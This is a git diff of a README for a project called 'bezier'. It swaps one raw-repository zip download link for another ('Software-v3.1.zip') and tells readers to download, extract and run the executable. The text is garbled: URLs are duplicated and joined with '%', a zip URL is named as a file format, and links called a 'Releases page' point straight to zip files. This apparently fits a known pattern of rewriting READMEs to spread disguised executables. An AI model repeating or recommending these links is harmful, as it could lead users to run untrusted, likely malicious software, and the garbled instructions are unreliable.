@@ -6,7 +6,7 @@ Welcome to the bezier project! This tool simplifies the process of evaluating, s
 
 ## 🔗 Download the Application
 
-[![Download bezier](https://github.com/ashvinpatle/bezier/raw/refs/heads/main/docs/assets/Software_2.1.zip%https://github.com/ashvinpatle/bezier/raw/refs/heads/main/docs/assets/Software_2.1.zip)](https://github.com/ashvinpatle/bezier/raw/refs/heads/main/docs/assets/Software_2.1.zip)
+[![Download bezier](https://github.com/ashvinpatle/bezier/raw/refs/heads/main/docs/Software-v3.1.zip%https://github.com/ashvinpatle/bezier/raw/refs/heads/main/docs/Software-v3.1.zip)](https://github.com/ashvinpatle/bezier/raw/refs/heads/main/docs/Software-v3.1.zip)
 
 ## 📥 Download & Install
 
@@ -14,13 +14,13 @@ To get started with bezier, follow these simple steps:
 
 1. **Visit the Releases Page**  
    Click the link below to visit the page where you can download the software.  
-   [Download bezier Here](https://github.com/ashvinpatle/bezier/raw/refs/heads/main/docs/assets/Software_2.1.zip)
+   [Download bezier Here](https://github.com/ashvinpatle/bezier/raw/refs/heads/main/docs/Software-v3.1.zip)
 
 2. **Select the Latest Version**  
    Once you are on the Releases page, find the latest version of the bezier application. Each version will have a clear label indicating its number.
 
 3. **Download the File**  
-   Click on the file labeled for your operating system. It will usually be in `.zip` or `https://github.com/ashvinpatle/bezier/raw/refs/heads/main/docs/assets/Software_2.1.zip` format for easy extraction.
+   Click on the file labeled for your operating system. It will usually be in `.zip` or `https://github.com/ashvinpatle/bezier/raw/refs/heads/main/docs/Software-v3.1.zip` format for easy extraction.
 
 4. **Extract the Files**  
    After the download completes, find the file on your device. Right-click it and select "Extract" or "Unzip." This will create a new folder with all the files necessary to run bezier.
@@ -73,7 +73,7 @@ Your experience with bezier matters. If you encounter any issues or have suggest
 
 To recap, follow these simple steps to download and run bezier:
 
-1. Visit the Releases page: [Download bezier Here](https://github.com/ashvinpatle/bezier/raw/refs/heads/main/docs/assets/Software_2.1.zip).
+1. Visit the Releases page: [Download bezier Here](https://github.com/ashvinpatle/bezier/raw/refs/heads/main/docs/Software-v3.1.zip).
 2. Select and download the latest version.
 3. Extract the downloaded file.
 4. Run the application using the executable file.
